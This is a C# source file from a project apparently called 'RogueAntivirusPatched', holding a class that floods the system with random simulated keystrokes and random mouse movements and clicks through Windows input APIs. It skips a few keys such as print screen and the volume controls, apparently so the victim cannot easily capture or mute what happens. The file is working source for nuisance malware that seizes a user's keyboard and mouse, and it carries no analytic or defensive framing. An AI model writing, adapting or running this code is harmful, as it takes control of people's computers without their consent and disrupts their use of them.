using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static MouseAndKeyboard.KeyboardInput;
using static MouseAndKeyboard.MouseInput;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Rebar;
using System.Windows.Forms;

namespace RogueAntivirusPatched.Classes
{
    public class VirtuaLInput
    {
        Random rand;

        public static int[] vks = (int[])Enum.GetValues(typeof(VK));
        public static byte[] bannedKeys = { (byte)VK.PRINT, (byte)VK.PRIOR, (byte)VK.SNAPSHOT, (byte)VK.KEY_S, (byte)VK.VOLUME_DOWN, (byte)VK.VOLUME_MUTE };
        public static uint[] dwFlags = (uint[])Enum.GetValues(typeof(dwFlags));

        public void CrazyKyboard()
        {
            byte allowedKey = 0;

            do
            {
                allowedKey = AllowedKey(vks, bannedKeys);
            }
            while (allowedKey == 0);

            keybd_event(allowedKey, 0x45, KEYEVENTF_EXTENDEDKEY, UIntPtr.Zero);
            keybd_event(allowedKey, 0x45, KEYEVENTF_KEYUP, UIntPtr.Zero);
        }

        public void CrazyMouseInput()
        {
            rand = new Random();
            var cursor = Cursor.Position;

            SetCursorPos(cursor.X + rand.Next(-5, 5), cursor.Y + rand.Next(-5, 5));

            int data = rand.Next(-10, 10);

            mouse_event(dwFlags[rand.Next(dwFlags.Length)], 0, 0, data, UIntPtr.Zero);
        }

        private byte AllowedKey(int[] vks, byte[] bannedKeys)
        {
            rand = new Random();
            byte choosenKey = (byte)vks[rand.Next(vks.Length)];

            foreach (byte banned in bannedKeys)
            {
                if (choosenKey == banned)
                    return 0;
            }
            return choosenKey;
        }
    }
}
